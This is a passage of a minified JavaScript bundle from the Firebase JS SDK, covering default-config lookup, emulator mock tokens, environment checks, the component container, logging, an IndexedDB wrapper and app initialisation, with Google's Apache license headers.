 */const k5=()=>x5().__FIREBASE_DEFAULTS__,C5=()=>{if(typeof I5>"u"||typeof{}>"u")return;const n={}.__FIREBASE_DEFAULTS__;if(n)return JSON.parse(n)},R5=()=>{if(typeof document>"u")return;let n;try{n=document.cookie.match(/__FIREBASE_DEFAULTS__=([^;]+)/)}catch{return}const e=n&&d2(n[1]);return e&&JSON.parse(e)},$p=()=>{try{return S5()||k5()||C5()||R5()}catch(n){console.info(`Unable to get __FIREBASE_DEFAULTS__ due to: ${n}`);return}},p2=n=>{var e,t;return(t=(e=$p())===null||e===void 0?void 0:e.emulatorHosts)===null||t===void 0?void 0:t[n]},M5=n=>{const e=p2(n);if(!e)return;const t=e.lastIndexOf(":");if(t<=0||t+1===e.length)throw new Error(`Invalid host ${e} with no separate hostname and port!`);const r=parseInt(e.substring(t+1),10);return e[0]==="["?[e.substring(1,t-1),r]:[e.substring(0,t),r]},g2=()=>{var n;return(n=$p())===null||n===void 0?void 0:n.config},m2=n=>{var e;return(e=$p())===null||e===void 0?void 0:e[`_${n}`]};/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class N5{constructor(){this.reject=()=>{},this.resolve=()=>{},this.promise=new Promise((e,t)=>{this.resolve=e,this.reject=t})}wrapCallback(e){return(t,r)=>{t?this.reject(t):this.resolve(r),typeof e=="function"&&(this.promise.catch(()=>{}),e.length===1?e(t):e(t,r))}}}/**
 * @license
 * Copyright 2021 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function P5(n,e){if(n.uid)throw new Error('The "uid" field is no longer supported by mockUserToken. Please use "sub" instead for Firebase Auth User ID.');const t={alg:"none",type:"JWT"},r=e||"demo-project",i=n.iat||0,s=n.sub||n.user_id;if(!s)throw new Error("mockUserToken must contain 'sub' or 'user_id' field!");const o=Object.assign({iss:`https://securetoken.google.com/${r}`,aud:r,iat:i,exp:i+3600,auth_time:i,sub:s,user_id:s,firebase:{sign_in_provider:"custom",identities:{}}},n),a="";return[Dd(JSON.stringify(t)),Dd(JSON.stringify(o)),a].join(".")}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function rr(){return typeof navigator<"u"&&typeof navigator.userAgent=="string"?navigator.userAgent:""}function L5(){return typeof window<"u"&&!!(window.cordova||window.phonegap||window.PhoneGap)&&/ios|iphone|ipod|ipad|android|blackberry|iemobile/i.test(rr())}function D5(){var n;const e=(n=$p())===null||n===void 0?void 0:n.forceEnvironment;if(e==="node")return!0;if(e==="browser")return!1;try{return Object.prototype.toString.call(globalThis.process)==="[object process]"}catch{return!1}}function O5(){return typeof navigator<"u"&&navigator.userAgent==="Cloudflare-Workers"}function B5(){const n=typeof chrome=="object"?chrome.runtime:typeof browser=="object"?browser.runtime:void 0;return typeof n=="object"&&n.id!==void 0}function U5(){return typeof navigator=="object"&&navigator.product==="ReactNative"}function j5(){const n=rr();return n.indexOf("MSIE ")>=0||n.indexOf("Trident/")>=0}function V5(){return!D5()&&!!navigator.userAgent&&navigator.userAgent.includes("Safari")&&!navigator.userAgent.includes("Chrome")}function F5(){try{return typeof indexedDB=="object"}catch{return!1}}function z5(){return new Promise((n,e)=>{try{let t=!0;const r="validate-browser-context-for-indexeddb-analytics-module",i=self.indexedDB.open(r);i.onsuccess=()=>{i.result.close(),t||self.indexedDB.deleteDatabase(r),n(!0)},i.onupgradeneeded=()=>{t=!1},i.onerror=()=>{var s;e(((s=i.error)===null||s===void 0?void 0:s.message)||"")}}catch(t){e(t)}})}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const W5="FirebaseError";class Es extends Error{constructor(e,t,r){super(t),this.code=e,this.customData=r,this.name=W5,Object.setPrototypeOf(this,Es.prototype),Error.captureStackTrace&&Error.captureStackTrace(this,mh.prototype.create)}}class mh{constructor(e,t,r){this.service=e,this.serviceName=t,this.errors=r}create(e,...t){const r=t[0]||{},i=`${this.service}/${e}`,s=this.errors[e],o=s?$5(s,r):"Error",a=`${this.serviceName}: ${o} (${i}).`;return new Es(i,a,r)}}function $5(n,e){return n.replace(H5,(t,r)=>{const i=e[r];return i!=null?String(i):`<${r}?>`})}const H5=/\{\$([^}]+)}/g;function q5(n){for(const e in n)if(Object.prototype.hasOwnProperty.call(n,e))return!1;return!0}function da(n,e){if(n===e)return!0;const t=Object.keys(n),r=Object.keys(e);for(const i of t){if(!r.includes(i))return!1;const s=n[i],o=e[i];if(sI(s)&&sI(o)){if(!da(s,o))return!1}else if(s!==o)return!1}for(const i of r)if(!t.includes(i))return!1;return!0}function sI(n){return n!==null&&typeof n=="object"}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function yh(n){const e=[];for(const[t,r]of Object.entries(n))Array.isArray(r)?r.forEach(i=>{e.push(encodeURIComponent(t)+"="+encodeURIComponent(i))}):e.push(encodeURIComponent(t)+"="+encodeURIComponent(r));return e.length?"&"+e.join("&"):""}function Qc(n){const e={};return n.replace(/^\?/,"").split("&").forEach(r=>{if(r){const[i,s]=r.split("=");e[decodeURIComponent(i)]=decodeURIComponent(s)}}),e}function Yc(n){const e=n.indexOf("?");if(!e)return"";const t=n.indexOf("#",e);return n.substring(e,t>0?t:void 0)}function K5(n,e){const t=new G5(n,e);return t.subscribe.bind(t)}class G5{constructor(e,t){this.observers=[],this.unsubscribes=[],this.observerCount=0,this.task=Promise.resolve(),this.finalized=!1,this.onNoObservers=t,this.task.then(()=>{e(this)}).catch(r=>{this.error(r)})}next(e){this.forEachObserver(t=>{t.next(e)})}error(e){this.forEachObserver(t=>{t.error(e)}),this.close(e)}complete(){this.forEachObserver(e=>{e.complete()}),this.close()}subscribe(e,t,r){let i;if(e===void 0&&t===void 0&&r===void 0)throw new Error("Missing Observer.");Q5(e,["next","error","complete"])?i=e:i={next:e,error:t,complete:r},i.next===void 0&&(i.next=xm),i.error===void 0&&(i.error=xm),i.complete===void 0&&(i.complete=xm);const s=this.unsubscribeOne.bind(this,this.observers.length);return this.finalized&&this.task.then(()=>{try{this.finalError?i.error(this.finalError):i.complete()}catch{}}),this.observers.push(i),s}unsubscribeOne(e){this.observers===void 0||this.observers[e]===void 0||(delete this.observers[e],this.observerCount-=1,this.observerCount===0&&this.onNoObservers!==void 0&&this.onNoObservers(this))}forEachObserver(e){if(!this.finalized)for(let t=0;t<this.observers.length;t++)this.sendOne(t,e)}sendOne(e,t){this.task.then(()=>{if(this.observers!==void 0&&this.observers[e]!==void 0)try{t(this.observers[e])}catch(r){typeof console<"u"&&console.error&&console.error(r)}})}close(e){this.finalized||(this.finalized=!0,e!==void 0&&(this.finalError=e),this.task.then(()=>{this.observers=void 0,this.onNoObservers=void 0}))}}function Q5(n,e){if(typeof n!="object"||n===null)return!1;for(const t of e)if(t in n&&typeof n[t]=="function")return!0;return!1}function xm(){}/**
 * @license
 * Copyright 2021 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function xn(n){return n&&n._delegate?n._delegate:n}class pa{constructor(e,t,r){this.name=e,this.instanceFactory=t,this.type=r,this.multipleInstances=!1,this.serviceProps={},this.instantiationMode="LAZY",this.onInstanceCreated=null}setInstantiationMode(e){return this.instantiationMode=e,this}setMultipleInstances(e){return this.multipleInstances=e,this}setServiceProps(e){return this.serviceProps=e,this}setInstanceCreatedCallback(e){return this.onInstanceCreated=e,this}}/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const Vo="[DEFAULT]";/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Y5{constructor(e,t){this.name=e,this.container=t,this.component=null,this.instances=new Map,this.instancesDeferred=new Map,this.instancesOptions=new Map,this.onInitCallbacks=new Map}get(e){const t=this.normalizeInstanceIdentifier(e);if(!this.instancesDeferred.has(t)){const r=new N5;if(this.instancesDeferred.set(t,r),this.isInitialized(t)||this.shouldAutoInitialize())try{const i=this.getOrInitializeService({instanceIdentifier:t});i&&r.resolve(i)}catch{}}return this.instancesDeferred.get(t).promise}getImmediate(e){var t;const r=this.normalizeInstanceIdentifier(e==null?void 0:e.identifier),i=(t=e==null?void 0:e.optional)!==null&&t!==void 0?t:!1;if(this.isInitialized(r)||this.shouldAutoInitialize())try{return this.getOrInitializeService({instanceIdentifier:r})}catch(s){if(i)return null;throw s}else{if(i)return null;throw Error(`Service ${this.name} is not available`)}}getComponent(){return this.component}setComponent(e){if(e.name!==this.name)throw Error(`Mismatching Component ${e.name} for Provider ${this.name}.`);if(this.component)throw Error(`Component for ${this.name} has already been provided`);if(this.component=e,!!this.shouldAutoInitialize()){if(J5(e))try{this.getOrInitializeService({instanceIdentifier:Vo})}catch{}for(const[t,r]of this.instancesDeferred.entries()){const i=this.normalizeInstanceIdentifier(t);try{const s=this.getOrInitializeService({instanceIdentifier:i});r.resolve(s)}catch{}}}}clearInstance(e=Vo){this.instancesDeferred.delete(e),this.instancesOptions.delete(e),this.instances.delete(e)}async delete(){const e=Array.from(this.instances.values());await Promise.all([...e.filter(t=>"INTERNAL"in t).map(t=>t.INTERNAL.delete()),...e.filter(t=>"_delete"in t).map(t=>t._delete())])}isComponentSet(){return this.component!=null}isInitialized(e=Vo){return this.instances.has(e)}getOptions(e=Vo){return this.instancesOptions.get(e)||{}}initialize(e={}){const{options:t={}}=e,r=this.normalizeInstanceIdentifier(e.instanceIdentifier);if(this.isInitialized(r))throw Error(`${this.name}(${r}) has already been initialized`);if(!this.isComponentSet())throw Error(`Component ${this.name} has not been registered yet`);const i=this.getOrInitializeService({instanceIdentifier:r,options:t});for(const[s,o]of this.instancesDeferred.entries()){const a=this.normalizeInstanceIdentifier(s);r===a&&o.resolve(i)}return i}onInit(e,t){var r;const i=this.normalizeInstanceIdentifier(t),s=(r=this.onInitCallbacks.get(i))!==null&&r!==void 0?r:new Set;s.add(e),this.onInitCallbacks.set(i,s);const o=this.instances.get(i);return o&&e(o,i),()=>{s.delete(e)}}invokeOnInitCallbacks(e,t){const r=this.onInitCallbacks.get(t);if(r)for(const i of r)try{i(e,t)}catch{}}getOrInitializeService({instanceIdentifier:e,options:t={}}){let r=this.instances.get(e);if(!r&&this.component&&(r=this.component.instanceFactory(this.container,{instanceIdentifier:Z5(e),options:t}),this.instances.set(e,r),this.instancesOptions.set(e,t),this.invokeOnInitCallbacks(r,e),this.component.onInstanceCreated))try{this.component.onInstanceCreated(this.container,e,r)}catch{}return r||null}normalizeInstanceIdentifier(e=Vo){return this.component?this.component.multipleInstances?e:Vo:e}shouldAutoInitialize(){return!!this.component&&this.component.instantiationMode!=="EXPLICIT"}}function Z5(n){return n===Vo?void 0:n}function J5(n){return n.instantiationMode==="EAGER"}/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class X5{constructor(e){this.name=e,this.providers=new Map}addComponent(e){const t=this.getProvider(e.name);if(t.isComponentSet())throw new Error(`Component ${e.name} has already been registered with ${this.name}`);t.setComponent(e)}addOrOverwriteComponent(e){this.getProvider(e.name).isComponentSet()&&this.providers.delete(e.name),this.addComponent(e)}getProvider(e){if(this.providers.has(e))return this.providers.get(e);const t=new Y5(e,this);return this.providers.set(e,t),t}getProviders(){return Array.from(this.providers.values())}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */var Qe;(function(n){n[n.DEBUG=0]="DEBUG",n[n.VERBOSE=1]="VERBOSE",n[n.INFO=2]="INFO",n[n.WARN=3]="WARN",n[n.ERROR=4]="ERROR",n[n.SILENT=5]="SILENT"})(Qe||(Qe={}));const eU={debug:Qe.DEBUG,verbose:Qe.VERBOSE,info:Qe.INFO,warn:Qe.WARN,error:Qe.ERROR,silent:Qe.SILENT},tU=Qe.INFO,nU={[Qe.DEBUG]:"log",[Qe.VERBOSE]:"log",[Qe.INFO]:"info",[Qe.WARN]:"warn",[Qe.ERROR]:"error"},rU=(n,e,...t)=>{if(e<n.logLevel)return;const r=new Date().toISOString(),i=nU[e];if(i)console[i](`[${r}]  ${n.name}:`,...t);else throw new Error(`Attempted to log a message with an invalid logType (value: ${e})`)};class Ev{constructor(e){this.name=e,this._logLevel=tU,this._logHandler=rU,this._userLogHandler=null}get logLevel(){return this._logLevel}set logLevel(e){if(!(e in Qe))throw new TypeError(`Invalid value "${e}" assigned to \`logLevel\``);this._logLevel=e}setLogLevel(e){this._logLevel=typeof e=="string"?eU[e]:e}get logHandler(){return this._logHandler}set logHandler(e){if(typeof e!="function")throw new TypeError("Value assigned to `logHandler` must be a function");this._logHandler=e}get userLogHandler(){return this._userLogHandler}set userLogHandler(e){this._userLogHandler=e}debug(...e){this._userLogHandler&&this._userLogHandler(this,Qe.DEBUG,...e),this._logHandler(this,Qe.DEBUG,...e)}log(...e){this._userLogHandler&&this._userLogHandler(this,Qe.VERBOSE,...e),this._logHandler(this,Qe.VERBOSE,...e)}info(...e){this._userLogHandler&&this._userLogHandler(this,Qe.INFO,...e),this._logHandler(this,Qe.INFO,...e)}warn(...e){this._userLogHandler&&this._userLogHandler(this,Qe.WARN,...e),this._logHandler(this,Qe.WARN,...e)}error(...e){this._userLogHandler&&this._userLogHandler(this,Qe.ERROR,...e),this._logHandler(this,Qe.ERROR,...e)}}const iU=(n,e)=>e.some(t=>n instanceof t);let oI,aI;function sU(){return oI||(oI=[IDBDatabase,IDBObjectStore,IDBIndex,IDBCursor,IDBTransaction])}function oU(){return aI||(aI=[IDBCursor.prototype.advance,IDBCursor.prototype.continue,IDBCursor.prototype.continuePrimaryKey])}const y2=new WeakMap,gy=new WeakMap,w2=new WeakMap,km=new WeakMap,Iv=new WeakMap;function aU(n){const e=new Promise((t,r)=>{const i=()=>{n.removeEventListener("success",s),n.removeEventListener("error",o)},s=()=>{t(oo(n.result)),i()},o=()=>{r(n.error),i()};n.addEventListener("success",s),n.addEventListener("error",o)});return e.then(t=>{t instanceof IDBCursor&&y2.set(t,n)}).catch(()=>{}),Iv.set(e,n),e}function lU(n){if(gy.has(n))return;const e=new Promise((t,r)=>{const i=()=>{n.removeEventListener("complete",s),n.removeEventListener("error",o),n.removeEventListener("abort",o)},s=()=>{t(),i()},o=()=>{r(n.error||new DOMException("AbortError","AbortError")),i()};n.addEventListener("complete",s),n.addEventListener("error",o),n.addEventListener("abort",o)});gy.set(n,e)}let my={get(n,e,t){if(n instanceof IDBTransaction){if(e==="done")return gy.get(n);if(e==="objectStoreNames")return n.objectStoreNames||w2.get(n);if(e==="store")return t.objectStoreNames[1]?void 0:t.objectStore(t.objectStoreNames[0])}return oo(n[e])},set(n,e,t){return n[e]=t,!0},has(n,e){return n instanceof IDBTransaction&&(e==="done"||e==="store")?!0:e in n}};function cU(n){my=n(my)}function uU(n){return n===IDBDatabase.prototype.transaction&&!("objectStoreNames"in IDBTransaction.prototype)?function(e,...t){const r=n.call(Cm(this),e,...t);return w2.set(r,e.sort?e.sort():[e]),oo(r)}:oU().includes(n)?function(...e){return n.apply(Cm(this),e),oo(y2.get(this))}:function(...e){return oo(n.apply(Cm(this),e))}}function hU(n){return typeof n=="function"?uU(n):(n instanceof IDBTransaction&&lU(n),iU(n,sU())?new Proxy(n,my):n)}function oo(n){if(n instanceof IDBRequest)return aU(n);if(km.has(n))return km.get(n);const e=hU(n);return e!==n&&(km.set(n,e),Iv.set(e,n)),e}const Cm=n=>Iv.get(n);function fU(n,e,{blocked:t,upgrade:r,blocking:i,terminated:s}={}){const o=indexedDB.open(n,e),a=oo(o);return r&&o.addEventListener("upgradeneeded",l=>{r(oo(o.result),l.oldVersion,l.newVersion,oo(o.transaction),l)}),t&&o.addEventListener("blocked",l=>t(l.oldVersion,l.newVersion,l)),a.then(l=>{s&&l.addEventListener("close",()=>s()),i&&l.addEventListener("versionchange",u=>i(u.oldVersion,u.newVersion,u))}).catch(()=>{}),a}const dU=["get","getKey","getAll","getAllKeys","count"],pU=["put","add","delete","clear"],Rm=new Map;function lI(n,e){if(!(n instanceof IDBDatabase&&!(e in n)&&typeof e=="string"))return;if(Rm.get(e))return Rm.get(e);const t=e.replace(/FromIndex$/,""),r=e!==t,i=pU.includes(t);if(!(t in(r?IDBIndex:IDBObjectStore).prototype)||!(i||dU.includes(t)))return;const s=async function(o,...a){const l=this.transaction(o,i?"readwrite":"readonly");let u=l.store;return r&&(u=u.index(a.shift())),(await Promise.all([u[t](...a),i&&l.done]))[0]};return Rm.set(e,s),s}cU(n=>({...n,get:(e,t,r)=>lI(e,t)||n.get(e,t,r),has:(e,t)=>!!lI(e,t)||n.has(e,t)}));/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class gU{constructor(e){this.container=e}getPlatformInfoString(){return this.container.getProviders().map(t=>{if(mU(t)){const r=t.getImmediate();return`${r.library}/${r.version}`}else return null}).filter(t=>t).join(" ")}}function mU(n){const e=n.getComponent();return(e==null?void 0:e.type)==="VERSION"}const yy="@firebase/app",cI="0.11.4";/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const gs=new Ev("@firebase/app"),yU="@firebase/app-compat",wU="@firebase/analytics-compat",vU="@firebase/analytics",_U="@firebase/app-check-compat",EU="@firebase/app-check",IU="@firebase/auth",SU="@firebase/auth-compat",TU="@firebase/database",AU="@firebase/data-connect",bU="@firebase/database-compat",xU="@firebase/functions",kU="@firebase/functions-compat",CU="@firebase/installations",RU="@firebase/installations-compat",MU="@firebase/messaging",NU="@firebase/messaging-compat",PU="@firebase/performance",LU="@firebase/performance-compat",DU="@firebase/remote-config",OU="@firebase/remote-config-compat",BU="@firebase/storage",UU="@firebase/storage-compat",jU="@firebase/firestore",VU="@firebase/vertexai",FU="@firebase/firestore-compat",zU="firebase",WU="11.6.0";/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const wy="[DEFAULT]",$U={[yy]:"fire-core",[yU]:"fire-core-compat",[vU]:"fire-analytics",[wU]:"fire-analytics-compat",[EU]:"fire-app-check",[_U]:"fire-app-check-compat",[IU]:"fire-auth",[SU]:"fire-auth-compat",[TU]:"fire-rtdb",[AU]:"fire-data-connect",[bU]:"fire-rtdb-compat",[xU]:"fire-fn",[kU]:"fire-fn-compat",[CU]:"fire-iid",[RU]:"fire-iid-compat",[MU]:"fire-fcm",[NU]:"fire-fcm-compat",[PU]:"fire-perf",[LU]:"fire-perf-compat",[DU]:"fire-rc",[OU]:"fire-rc-compat",[BU]:"fire-gcs",[UU]:"fire-gcs-compat",[jU]:"fire-fst",[FU]:"fire-fst-compat",[VU]:"fire-vertex","fire-js":"fire-js",[zU]:"fire-js-all"};/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const qu=new Map,HU=new Map,vy=new Map;function uI(n,e){try{n.container.addComponent(e)}catch(t){gs.debug(`Component ${e.name} failed to register with FirebaseApp ${n.name}`,t)}}function Hl(n){const e=n.name;if(vy.has(e))return gs.debug(`There were multiple attempts to register component ${e}.`),!1;vy.set(e,n);for(const t of qu.values())uI(t,n);for(const t of HU.values())uI(t,n);return!0}function Sv(n,e){const t=n.container.getProvider("heartbeat").getImmediate({optional:!0});return t&&t.triggerHeartbeat(),n.container.getProvider(e)}function oi(n){return n==null?!1:n.settings!==void 0}/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const qU={"no-app":"No Firebase App '{$appName}' has been created - call initializeApp() first","bad-app-name":"Illegal App name: '{$appName}'","duplicate-app":"Firebase App named '{$appName}' already exists with different options or config","app-deleted":"Firebase App named '{$appName}' already deleted","server-app-deleted":"Firebase Server App has been deleted","no-options":"Need to provide options, when not being deployed to hosting via source.","invalid-app-argument":"firebase.{$appName}() takes either no argument or a Firebase App instance.","invalid-log-argument":"First argument to `onLog` must be null or a function.","idb-open":"Error thrown when opening IndexedDB. Original error: {$originalErrorMessage}.","idb-get":"Error thrown when reading from IndexedDB. Original error: {$originalErrorMessage}.","idb-set":"Error thrown when writing to IndexedDB. Original error: {$originalErrorMessage}.","idb-delete":"Error thrown when deleting from IndexedDB. Original error: {$originalErrorMessage}.","finalization-registry-not-supported":"FirebaseServerApp deleteOnDeref field defined but the JS runtime does not support FinalizationRegistry.","invalid-server-app-environment":"FirebaseServerApp is not for use in browser environments."},ao=new mh("app","Firebase",qU);/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class KU{constructor(e,t,r){this._isDeleted=!1,this._options=Object.assign({},e),this._config=Object.assign({},t),this._name=t.name,this._automaticDataCollectionEnabled=t.automaticDataCollectionEnabled,this._container=r,this.container.addComponent(new pa("app",()=>this,"PUBLIC"))}get automaticDataCollectionEnabled(){return this.checkDestroyed(),this._automaticDataCollectionEnabled}set automaticDataCollectionEnabled(e){this.checkDestroyed(),this._automaticDataCollectionEnabled=e}get name(){return this.checkDestroyed(),this._name}get options(){return this.checkDestroyed(),this._options}get config(){return this.checkDestroyed(),this._config}get container(){return this._container}get isDeleted(){return this._isDeleted}set isDeleted(e){this._isDeleted=e}checkDestroyed(){if(this.isDeleted)throw ao.create("app-deleted",{appName:this._name})}}/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const uc=WU;function Hp(n,e={}){let t=n;typeof e!="object"&&(e={name:e});const r=Object.assign({name:wy,automaticDataCollectionEnabled:!1},e),i=r.name;if(typeof i!="string"||!i)throw ao.create("bad-app-name",{appName:String(i)});if(t||(t=g2()),!t)throw ao.create("no-options");const s=qu.get(i);if(s){if(da(t,s.options)&&da(r,s.config))return s;throw ao.create("duplicate-app",{appName:i})}const o=new X5(i);for(const l of vy.values())o.addComponent(l);const a=new KU(t,r,o);return qu.set(i,a),a}function v2(n=wy){const e=qu.get(n);if(!e&&n===wy&&g2())return Hp();if(!e)throw ao.create("no-app",{appName:n});return e}function Od(){return Array.from(qu.values())}function lo(n,e,t){var r;let i=(r=$U[n])!==null&&r!==void 0?r:n;t&&(i+=`-${t}`);const s=i.match(/\s|\//),o=e.match(/\s|\//);if(s||o){const a=[`Unable to register library "${i}" with version "${e}":`];s&&a.push(`library name "${i}" contains illegal characters (whitespace or "/")`),s&&o&&a.push("and"),o&&a.push(`version name "${e}" contains illegal characters (whitespace or "/")`),gs.warn(a.join(" "));return}Hl(new pa(`${i}-version`,()=>({library:i,version:e}),"VERSION"))}/**
 * @license
 * Copyright 2021 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
